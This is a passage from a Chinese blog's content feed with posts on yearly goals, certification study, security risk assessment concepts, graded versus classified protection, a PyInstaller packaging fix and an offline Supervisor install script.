src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再见2020,2021我来了！</title>
      <link href="/posts/e5fab05b/"/>
      <url>/posts/e5fab05b/</url>
      
        <content type="html"><![CDATA[<p>今天是2021年1月1日，按照惯例应该是回忆过去展望未来的一天。</p><h2 id="回忆过去："><a href="#回忆过去：" class="headerlink" title="回忆过去："></a>回忆过去：</h2><p>在过去的一年里，曾今在2020年立下的flag是否都实现了呢？</p><p><strong>2020的flag：</strong></p><ul><li>看完10本英文原著。</li><li>爱分享网站运营PV要达5W,UV达5千</li><li>每周至少发一篇微信公众号文章</li><li>开通自己的博客</li><li>每周至少跑步3次</li></ul><p>2020年完成得最好的是看完了10本英文原著，因为2020过春节到第一季度受疫情影响，老老实实待在家里。在5月份就看完了10本英文原著。但是后来却没有坚持下来。看英文原著的热情慢慢的消退下来。一是看了这么多本原著似乎英文还是那么的菜打击了自己的信心，二是看英文原著比较耗时间4、5月份开始正常上班后时间就显得比较紧张了。后来7月份的时候准备考通信工程师的考试，时间更加紧张。所以继续看英文原著的事情就放下来了。英文很重要，学习英文2020年还是要继续坚持。</p><p> 爱分享网站因为各种原因在7月份的时候基本上已经停了，但是服务器还在续费。其实在5,6月份以前网站的访问量等各方面指标都一直在上升，因为疫情大家可能待在家里看书的需求量大增，网站的访问量一直都在持续的上升。如果网站不停基本上运营的flag还是可以达到的。现在的环境对于个人网站来说很艰难了。网站还会继续下去主要内容会以自己的博客为主了。</p><p>因为网站基本停了，一直在想网站生存的方向。微信公众号的文章也比较少更新了。还是自己肚子里的货太少了，写了一段时间以后发现没啥东西写了，坚持不下去了。真佩服那些现在还在每天更新的微信公众号。</p><p>经过多方比较决定用hexo来搭建自己的博客。写博客已经被认为是很古老的方式了，一直以来都很羡慕那些一直坚持下来的优质博主。想通过博客的方式记录自己的学习、生活、工作。2020年共写了24篇博客，产量不是很高，说明思考和积累还是不够。</p><p>跑步锻炼，在夏天天气好的时候还是坚持得不错，每周基本上坚持了一次。天气渐渐冷了起来以后懒筋发作很少出去跑步了。看着自己日益发胖的体重，要深刻的检讨一下。</p><p>2020年全年阅读量有所减少在豆瓣上标记只读了29本书。因为2020年中旬的时候决定考通信工程师和信息安全工程师，所以其他书看得比较少了。经过几个月的努力，顺利通过了通信工程师和信息安全工程师的考试。虽然2020年年初立的flag很多都没有完成，完成了的效果也不是特别好，但是过了通信工程师和信息安全工程师心里稍微有点宽慰。毕竟2020年努力过。</p><h2 id="展望未来："><a href="#展望未来：" class="headerlink" title="展望未来："></a>展望未来：</h2><p>不管怎么样，2020年已经成为过去式了。崭新的2021已经来到，先立下2021年的flag。</p><p><strong>2021年flag:</strong></p><ul><li>考CISP</li><li>考一建</li><li>发两篇论文</li><li>至少写30篇博客文章</li><li>完成12本英文原著</li><li>完成50本书籍的阅读量</li></ul><p>2021加油！</p>]]></content>
      
      
      <categories>
          
          <category> 人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自我管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工作这么多年了，我为什么还在考证</title>
      <link href="/posts/9fed4f95/"/>
      <url>/posts/9fed4f95/</url>
      
        <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20201218/%E5%AD%A6%E4%B9%A0%E5%AD%A6%E4%B9%A0.png" alt="学习学习"></p><p>工作这么多年了，我为什么还在考证？</p><p>因为以前一直没有考过啊！</p><p>毕业以来参加工作后，一直以来认为考证没有啥用处。一方面，因为找工作太过顺利，那会儿找工作也没有看到别人拿什么证去找工作，也没有看到那家公司的招聘广告上写需要什么什么证书。另一方面，由于才从学校出来对于学习考试有种天然的排斥。想想这么多年以来一直都是在学习考试。好不容易毕业了那还不好好放松一下。现在回想起来真是too young,too simple。</p><p>工作这么多年，都是在从事研发相关的工作。一开始写代码，要学的东西挺多的，从毕业时候的ASP到Java。能够完成工作任务，能够做出东西来才是硬道理。后来做项目经理，产品经理也是没有经过系统的培训和学习，在项目中磨练在项目中成长。在公司也带了几个重点大项目，项目也交付得令公司和客户比较满意。想想这研发和项目管理就那么回事。貌似所有的公司都是一样，不管你用什么办法，能够搞定项目的就是好的项目经理。至于有没有证没人关注。甚至公司过CMMI5的时候，我带的项目被抽为参审项目，我还没有系统的学过项目管理。虽然CMMI5已经过了，但是总感觉过得挺虚的。基本上就是在咨询公司的指导下，要你干什么就干什么，要你准备什么就准备什么。至于为啥是这样完全是懵逼。</p><p>人过中年，似乎不管到哪里都充满着危机感。以前自以为自己技术很牛逼，项目管理方面也是相当的OK。随着时间的推移这种自信心慢慢的越来越消退。大家都说搞IT的就是吃青春饭。就像随着年龄的增长，身体越来虚一样，心里也是越来越虚。心里虚了以后就想自己应该多学习提高自己。但是一段时间发现要学的东西实在是太多了，技术的、管理的。东一下西一下的，也没有什么效果。后来自己总结了一下，没有目标的学习都是假装在学习，只不过是安慰自己罢了。一定要给自己定个目标要学哪个方向，而检验学习效果的办法非常简单粗暴–考证。以考促学。能够考证通过不能说明你学得有多么的精深，至少也说明你达到了基本的平均水平。没有考试就没有压力，一本书拖拖拉拉看了一年还在看。而考试时间临近的压力对于深度拖延症患者也是一个很好的治愈方式。</p><p>就这样，我给自己制定的第一个学习目标就是系统的学习项目管理的理论体系，所以报了软考的信息系统项目管理师。经过半年多的学习顺利的拿到了信息系统项目管理师的证。学习的时候还是有一些感触，原来自己在平时的项目管理工作中还是有理论支撑的，人家在书中就已经写了。一些平时没有注意考虑到的点书上也有总结。回想起自己带的项目过CMMI5和过ISO认证等，以及公司的项目管理体系和质量管理体系结合书中的知识点，至少把我零散的一些项目管理知识和经验给系统化、体系化的联系起来了，让我对项目管理有了更深切的理解。尤其是在后来信息系统项目管理师考试写论文的时候，就能够可以很好的理论联系实践。</p><p>嗯，工作这么多年，我终于可以持证上岗了！</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习考试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络信息安全管理要素和安全风险评估</title>
      <link href="/posts/8a1fa561/"/>
      <url>/posts/8a1fa561/</url>
      
        <content type="html"><![CDATA[<p>网络信息安全管理要素由网络管理对象、网络威胁、网络脆弱性、网络风险、网络保护措施组成。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20201204/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%A6%81%E7%B4%A0.png" alt="网络信息安全管理要素"><br>由于网络管理对象自身的脆弱性，使得威胁的发生成为可能，从而造成了不同的影响，形成了风险。</p><p>网络安全管理实际上就是风险控制，其基本过程是通过网络管理对象的威胁和脆弱性进行分析，确定网络管理对象的价值、网络管理对象威胁发生的可能性、网络管理对象的脆弱程度，从而确定网络管理对象的风险等级，然后据此选取合适的安全保护措施，降低网络管理对象的风险。</p><p>所有的安全管理、安全服务、安全技术等都是围绕网络信息安全管理要素来的。</p><p>网络安全风险评估是评价网络信息系统遭受潜在的安全威胁所产生的影响。</p><p>网络安全风险，是指由于网络系统所存在的脆弱性，因人为或自然的威胁导致安全事件发生所造成的可能性。网络风险评估就是评估威胁者利用网络资产的脆弱性，造成网络资产损失的严重程度。</p><p>网络安全风险评估过程，主要包括网络安全风险评估准备、资产识别、威胁识别、脆弱性识别、已有的安全措施分析、网络安全风险分析、网络安全风险处置与管理等。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20201204/%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E6%B5%81%E7%A8%8B.png" alt="网络安全风险评估过程"><br><strong>资产识别</strong>包含“网络资产鉴定”和“网络资产价值估算”。前者给出评估所考虑的具体对象，确认网络资产种类和清单，是整个评估工作的基础。常见的网络资产主要分为网络设备、主机、服务器、应用、数据和文档资产等六个方面。</p><p>“网络资产价值估算”是某一具体资产在网络系统中的重要程度确认。</p><p>威胁是指可能对评估对象造成损害的外部原因。威胁利用评估对象自身的脆弱性，采用一定的途径和方式，对评估对象造成损害或损失，从而形成风险，<strong>威胁识别</strong>是对网络资产有可能受到的安全危害进行分析，一般从威胁来源、威胁途径、威胁意图等几个方面来分析。</p><p>脆弱性是指评估对象存在一个或多个脆弱的管理、技术、业务方面的漏洞，这些漏洞可能会被威胁所利用。<strong>脆弱性识别</strong>是指通过各种测试方法，获得网络资产中所存在的缺陷清单，这些缺陷会导致对信息资产的非授权访问、泄密、失控、破坏或不可用、绕过已有的安全机制，缺陷的存在将会危及网络资产的安全。</p><table><thead><tr><th>任务</th><th>输出文档</th><th>文档内容</th></tr></thead><tbody><tr><td>风险评估准备</td><td>会议记录并确认需要评估的系统、评估计划和评估程序</td><td>评估系统、评估计划和内容安排，双方负责人及需要明确的协调工作</td></tr><tr><td>访谈</td><td>针对业务系统进行技术安全和管理安全评估的访谈表</td><td>业务系统描述、运营情况和用户群体，并了解业务管理流程</td></tr><tr><td>文档审查（资产识别）</td><td>资产审查记录和业务系统审查记录</td><td>资产管理台账、网络拓扑图、业务运营管理制度和责任人</td></tr><tr><td>威胁识别</td><td>技术安全测评的网络、主机、应用测评结果记录，工具测试完成后的电子输出记录</td><td>漏洞扫描、渗透性测试、性能测试、入侵检测和协议分析等内容的技术测试结果</td></tr><tr><td>脆弱性识别</td><td>根据威胁识别结果，技术安全测评的网络、主机、应用测评</td><td>检查检查内容的记录，并根据威胁对业务系统脆弱性进行识别</td></tr><tr><td>风险处置</td><td>风险处置措施记录</td><td>对已识别的风险进行评估和处置，并评估是否存在残余风险</td></tr><tr><td>风险管理</td><td>对可接受的残余风险进行风险管理并出具风险评估报告</td><td>风险评估过程中发现的问题、问题的证据和证据源、每项检查活动中测评委托单位配合人员的书面认可</td></tr></tbody></table><p>网络安全风险分析是指在资产评估、威胁评估、脆弱性评估、安全管理评估、安全影响评估的基础上，综合利用定性和定量的分析方法，选择适当的风险计算方法或工具确定风险的大小与风险等级，即对网络系统安全管理范围内的每一个网络资产因遭受泄露、修改、不可用和破坏所带来的任何影响做出一个风险测量的列表，以便识别与选择适当和正确的安全控制方式。通过分析所评估的数据，进行风险值计算。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20201204/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E5%88%86%E6%9E%90.png" alt="网络安全风险分析"></p><p>网络安全风险分析的主要步骤如下：<br>一、对资产进行识别，并对资产的价值进行赋值。<br>二、对威胁进行识别，描述威胁的属性，并对威胁出现的频率赋值。<br>三、对脆弱性进行识别，并对具体资产的脆弱性的严重程度赋值。<br>四、根据威胁及威胁利用脆弱性的难易程度判断安全事件发生的可能性<br>五、根据脆弱性的严重程度及安全事件所作用的资产价值计算安全事件的损失。<br>六、根据安全事件发生的可能性及安全事件出现后的损失，计算安全事件一旦发生对组织的影响，即网络安全风险值。其中，安全事件损失是指确定已经鉴定的资产受到损害所带来的影响。</p><hr><p>作者博客:<a href="http://xiejava.ishareread.com" target="_blank" rel="noopener">http://xiejava.ishareread.com</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyinstaller打包exe后不能运行报Failed to execute script XXXX问题分析与处理</title>
      <link href="/posts/19a32f6f/"/>
      <url>/posts/19a32f6f/</url>
      
        <content type="html"><![CDATA[<p>最近用python的tkinter写了个小工具，发现用pyinstaller打包成exe后运行出错。报Failed to execute script XXXX</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -w worksubmit.py</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20201101/%E6%8A%A5%E9%94%99.png" alt="报错"></p><p>为了搞清楚报错的原因，想看到程序具体执行的情况。可以通过不带-w的参数打包在控制台看程序执行情况。<br><code>pyinstaller -F worksubmit.py</code> 可以通过不带-w的参数打包，这时打包的exe运行是带控制台的命令行</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20201101/%E8%BF%90%E8%A1%8C.png" alt="运行情况"></p><p>可以清楚的看到</p><blockquote><p>ModuleNotFoundError:No module named ‘xlrd’</p></blockquote><p>这时就要解决打包时xlrd模块没有打进去的问题，找到xlrd模块的位置，并将该模块打到运行程序包里。<br>先找到程序依赖的xlrd模块的位置，在PyCharm中通过”File”-&gt;”Setting”,在项目设置里查看Project interpreter，可以看到xlrd的目录位置。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20201101/%E6%89%BE%E5%8C%85%E8%B7%AF%E5%BE%84.png" alt="找包路径"></p><p>用pyinstall打包的时候通过加-p的参数将依赖的模块打进去。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F -p J:\study\python\testsubmit\venv\Lib\site-packages worksubmit.py</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20201101/%E6%89%93%E4%BE%9D%E8%B5%96%E6%A8%A1%E5%9D%97%E5%8C%85.png" alt="在这里插入图片描述"><br>这样就可以顺利将依赖的模块打进去，再执行exe文件不再报错了。</p><p><strong>总结一下，碰到打包成exe后运行有问题，可以通过不带-w的参数打包，这时打包的exe运行是带控制台的命令行。基本上所有的运行问题都可以通过控制台的命令定位和排查。</strong></p><hr><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>等级保护与分级保护的关系和区别</title>
      <link href="/posts/dc4d08f1/"/>
      <url>/posts/dc4d08f1/</url>
      
        <content type="html"><![CDATA[<p>等级保护与分级保护既有联系又有区别：</p><p>国家安全信息等级保护，重点保护的对象是非涉密的涉及国计民生的重要信息系统和通信基础信息系统；涉密信息系统分级保护是国家信息安全等级保护的重要组成部分，是等级保护在涉密领域的具体体现。</p><p>国家安全信息等级保护重点保护的对象是涉及国计民生的重要信息系统和通信基础信息系统，而不论它是否涉密。涉密信息系统分级保护保护的对象是所有涉及国家秘密的信息系统，重点是党政机关、军队和军工单位，由各级保密工作部门根据涉密信息系统的保护等级实施监督管理，确保系统和信息安全，确保国家秘密不被泄漏。</p><p>国家信息安全等级保护是国家从整体上、根本上解决国家信息安全问题的办法,进一步确定了信息安全发展的主线和中心任务,提出了总体要求。对信息系统实行等级保护是国家法定制度和基本国策，是开展信息安全保护工作的有效办法，是信息安全保护工作的发展方向。而涉密信息系统分级保护则是国家信息安全等级保护在涉及国家秘密信息的信息系统中的特殊保护措施与方法。</p><p><strong>等级保护与分级保护本质的区别是等级保护适用的对象为非涉密信息系统，分级保护适用的对象为涉密信息系统。</strong></p><p>具体区别如下：</p><table><thead><tr><th>项目</th><th>等级保护</th><th>分级保护</th></tr></thead><tbody><tr><td>管理体系</td><td>公安机关</td><td>国家保密部门</td></tr><tr><td>标准体系</td><td>国家标准（GB、GB/T）</td><td>国家保密标准（BMB，强制执行）</td></tr><tr><td>适用对象</td><td>非涉密信息系统</td><td>涉密信息系统</td></tr><tr><td>定级依据</td><td>等级保护定级是依据重要业务系统与承载业务运行的网络、设备、系统及单位属性、遭到破坏后所影响的主、客体关系等。</td><td>分级保护定级是依据信息的重要性，以信息最高密级确定受保护的级别。</td></tr><tr><td>级别划分</td><td>第一级：自主保护级<br>第二级：指导保护级<br>第三极：监督保护级<br>第四级：强制保护级<br>第五级：专控保护级</td><td>秘密级<br>机密级<br>绝密级</td></tr><tr><td>工作内容</td><td>信息系统等级保护工作包括：<br>系统定级、系统备案、安全建设整改、等级测评和监督检查五个环节。</td><td>涉密信息系统分级保护工作包括:<br>系统定级、方案设计、工程实施、系统测评、系统审批、日常管理、测评与检查和系统废止八个环节。</td></tr><tr><td>测评频率</td><td>第三级信息系统：应每年至少进行一次等级测评；<br>第四级信息系统：应每年至少进行一次等级测评；<br>第五级信息系统：应当根据特殊安全要求进行等级测评。</td><td>秘密级、机密级信息系统：应每两年至少进行一次安全保密测评或保密检查；<br>绝密级信息系统：应每年至少进行一次安全保密测评或保密检查。</td></tr><tr><td>评测机构</td><td>国家信息安全等级保护工作协调小组办公室授权的信息安全等级保护测评机构</td><td>由国家保密工作部门授权的系统测评机构</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Supervisor离线安装及使用</title>
      <link href="/posts/d670c9b8/"/>
      <url>/posts/d670c9b8/</url>
      
        <content type="html"><![CDATA[<p>Supervisor是用Python开发的一套通用的进程管理程序，能将一个普通的命令行进程变为后台daemon，并监控进程状态，异常退出时能自动重启。它是通过fork/exec的方式把这些被管理的进程当作supervisor的子进程来启动，这样只要在supervisor的配置文件中，把要管理的进程的可执行文件的路径写进去即可。也实现当子进程挂掉的时候，父进程可以准确获取子进程挂掉的信息的，可以选择是否自己启动和报警</p><p>supervisor的安装有多种方式<br>配置好yum源后，可以直接安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install supervisor</span><br></pre></td></tr></table></figure><p>Debian/Ubuntu可通过apt安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install supervisor</span><br></pre></td></tr></table></figure><p>pip安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install supervisor</span><br></pre></td></tr></table></figure><p>easy_install安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">easy_install</span><br></pre></td></tr></table></figure><p>这几种安装方式都需要在线联网。但大部分的生产环境都是离线环境，是封闭的网络没有办法在线安装。</p><p>这里整理了Supervisor的离线安装包和安装脚本，可以进行离线安装并能指定安装目录。</p><h1 id="一、整理Supervisor安装需要的工具和依赖包"><a href="#一、整理Supervisor安装需要的工具和依赖包" class="headerlink" title="一、整理Supervisor安装需要的工具和依赖包"></a>一、整理Supervisor安装需要的工具和依赖包</h1><p>包括有：<br>setuptools<br>elementtree<br>meld3<br>supervisor</p><h1 id="二、编写离线安装脚本"><a href="#二、编写离线安装脚本" class="headerlink" title="二、编写离线安装脚本"></a>二、编写离线安装脚本</h1><p>整体思路：依次解压并安装Supervisor所需要的工具和依赖包，将Supervisor的配置文件的默认安装目录路径替换成制定的目录路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi install_supervisor.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="keyword">function</span> Install_Supervisor()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">#Install supervisord</span></span><br><span class="line">    tar -zxvf setuptools-24.0.2.tar.gz 2&gt;&amp;1 &gt;/dev/null</span><br><span class="line">    <span class="built_in">cd</span> setuptools-24.0.2/</span><br><span class="line">    python setup.py install &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    <span class="built_in">cd</span> ..</span><br><span class="line">    easy_install elementtree-1.2.7-20070827-preview.zip &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    easy_install meld3-0.6.5.tar.gz 2&gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    easy_install supervisor-3.3.0.tar.gz &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    mkdir -p <span class="variable">$&#123;INSTALL_DIR&#125;</span>/etc/</span><br><span class="line">    mkdir -p <span class="variable">$&#123;INSTALL_DIR&#125;</span>/tmp/</span><br><span class="line">    mkdir -p <span class="variable">$&#123;INSTALL_DIR&#125;</span>/logs/</span><br><span class="line">    cp etc/supervisord.conf <span class="variable">$&#123;INSTALL_DIR&#125;</span>/etc/</span><br><span class="line">    sed -i <span class="string">"s#__install_dir__#<span class="variable">$&#123;INSTALL_DIR&#125;</span>#g"</span> <span class="variable">$&#123;INSTALL_DIR&#125;</span>/etc/supervisord.conf</span><br><span class="line">    sed -i <span class="string">"s#__user__#<span class="variable">$&#123;USER&#125;</span>#g"</span> <span class="variable">$&#123;INSTALL_DIR&#125;</span>/etc/supervisord.conf</span><br><span class="line">    ln -s /usr/bin/supervisorctl <span class="variable">$&#123;INSTALL_DIR&#125;</span>/commandctl</span><br><span class="line">    cp run_supervisor.sh <span class="variable">$&#123;INSTALL_DIR&#125;</span>/</span><br><span class="line">    sed -i <span class="string">"s#__install_dir__#<span class="variable">$&#123;INSTALL_DIR&#125;</span>#g"</span> <span class="variable">$&#123;INSTALL_DIR&#125;</span>/run_supervisor.sh</span><br><span class="line">    chmod +x <span class="variable">$&#123;INSTALL_DIR&#125;</span>/run_supervisor.sh</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">USER=<span class="string">'root'</span></span><br><span class="line"><span class="keyword">if</span> [ ! -n <span class="string">"<span class="variable">$1</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">   INSTALL_DIR=<span class="string">'/app/supervisor'</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   INSTALL_DIR=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">Install_Supervisor</span><br></pre></td></tr></table></figure><p>安装脚本中默认的安装路径是/app/supervisor，可以根据实际情况进行调整。</p><p>另外整理了一个run_supervisor.sh的脚本，在安装以后根据安装目录来生成这个启动脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"><span class="built_in">cd</span> __install_dir__</span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="string">"tmp"</span> ];<span class="keyword">then</span></span><br><span class="line">  mkdir tmp</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"tmp文件夹已经存在"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="string">"logs"</span> ];<span class="keyword">then</span></span><br><span class="line">  mkdir logs</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"logs文件夹已经存在"</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">/usr/bin/supervisord -c __install_dir__/etc/supervisord.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"supervisord 已执行。"</span></span><br></pre></td></tr></table></figure><h1 id="三、将所有的安装包脚本等打成离线安装包"><a href="#三、将所有的安装包脚本等打成离线安装包" class="headerlink" title="三、将所有的安装包脚本等打成离线安装包"></a>三、将所有的安装包脚本等打成离线安装包</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf  supervisor_install_pack.tar.gz  supervisor</span><br></pre></td></tr></table></figure><p>已打好的离线安装包下载 <a href="https://545c.com/file/21165215-443895501" target="_blank" rel="noopener">https://545c.com/file/21165215-443895501</a><br><a href="https://545c.com/file/21165215-443895501" target="_blank" rel="noopener">城通网盘下载</a>   <a href="https://545c.com/file/21165215-443895501" target="_blank" rel="noopener">https://545c.com/file/21165215-443895501</a><br><a href="https://download.csdn.net/download/fullbug/12434225" target="_blank" rel="noopener">CSDN下载</a> <a href="https://download.csdn.net/download/fullbug/12434225" target="_blank" rel="noopener">https://download.csdn.net/download/fullbug/12434225</a></p><h1 id="四、离线安装包使用"><a href="#四、离线安装包使用" class="headerlink" title="四、离线安装包使用"></a>四、离线安装包使用</h1><p>下载离线安包，解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf supervisor_install_pack.tar.gz</span><br></pre></td></tr></table></figure><p>解压后看到supervisor的目录，在supervisor的目录中找到install_supervisor.sh的脚本<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200518/1.png" alt="supervisor离线包安装目录"><br>执行install_supervisor.sh的脚本，默认安装/app/supervisor下，可以带参数指定安装目录。也可以修改install_supervisor.sh脚本自定义默认的安装路径。<br>执行完安装脚本，就可以在/app/supervisor目录下看到有相应的启动脚本、配置文件目录、日志目录及临时文件目录。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200518/2.png" alt="supervisor运行目录"><br>执行run_supervisor.sh就可以启动supervisor</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run_supervisor.sh</span><br></pre></td></tr></table></figure><h1 id="五、验证和使用supervisor"><a href="#五、验证和使用supervisor" class="headerlink" title="五、验证和使用supervisor"></a>五、验证和使用supervisor</h1><p>ps -ef|grep supervisor  查看supervisor是否已经启动</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200518/3.png" alt="查看supervisor是否已经启动"></p><p>通过web界面的9001看web界面控制台<a href="http://127.0.0.1:9001" target="_blank" rel="noopener">http://127.0.0.1:9001</a></p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20200518/4.png" alt="web界面控制台"></p><ul><li><p>supervisord<br>运行 Supervisor 时会启动一个进程 supervisord，它负责启动所管理的进程，并将所管理的进程作为自己的子进程来启动，而且可以在所管理的进程出现崩溃时自动重启。<br>supervisord -v 查看supervisor版本号</p></li><li><p>supervisorctl<br>是命令行管理工具，可以用来执行 stop、start、restart 等命令，来对这些子进程进行管理。<br>supervisor是所有进程的父进程，管理着启动的子进展，supervisor以子进程的PID来管理子进程，当子进程异常退出时supervisor可以收到相应的信号量。</p></li></ul><p><strong>supervisor常用管理命令</strong><br>supervisorctl restart &lt; application name&gt; ;重启指定应用<br>supervisorctl stop &lt; application name&gt; ;停止指定应用<br>supervisorctl start &lt; application name&gt; ;启动指定应用<br>supervisorctl restart all ;重启所有应用<br>supervisorctl stop all ;停止所有应用<br>supervisorctl start all ;启动所有应用</p><h1 id="六、配置文件说明"><a href="#六、配置文件说明" class="headerlink" title="六、配置文件说明"></a>六、配置文件说明</h1><h2 id="supervisor-conf配置文件"><a href="#supervisor-conf配置文件" class="headerlink" title="supervisor.conf配置文件"></a>supervisor.conf配置文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 